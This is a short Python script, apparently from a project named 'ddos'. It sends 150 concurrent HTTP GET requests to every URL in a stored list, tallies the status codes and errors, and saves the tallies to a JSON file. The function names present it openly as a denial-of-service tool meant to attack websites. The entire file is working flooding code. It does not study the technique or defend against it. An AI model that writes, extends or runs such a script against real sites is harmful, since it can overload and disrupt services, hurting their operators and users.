import asyncio
import json

from aiohttp import ClientSession
from ddos.storage import url_list, ddos_results


async def make_request(url):
    async with ClientSession() as s:
        resp = await s.get(url)
        return resp.status


async def attack_site(url):
    result_for_url = ddos_results[url]
    try:
        request_status = await make_request(url)
        if request_status not in result_for_url:
            result_for_url[request_status] = 0

        result_for_url[request_status] += 1

    except Exception as e:
        if not result_for_url.get('errors'):
            result_for_url['errors'] = e


async def make_ddos_atacks(url):
    tasks = [attack_site(url) for i in range(150)]

    await asyncio.gather(*tasks)


async def main(url_list):
    tasks = [make_ddos_atacks(url) for url in url_list]

    await asyncio.gather(*tasks)


if __name__ == '__main__':
    for url in url_list:
        ddos_results[url] = {}

    asyncio.run(main(url_list))
    print(ddos_results)
    with open('ddos_results.json', 'w') as file:
        json.dump(ddos_results, file)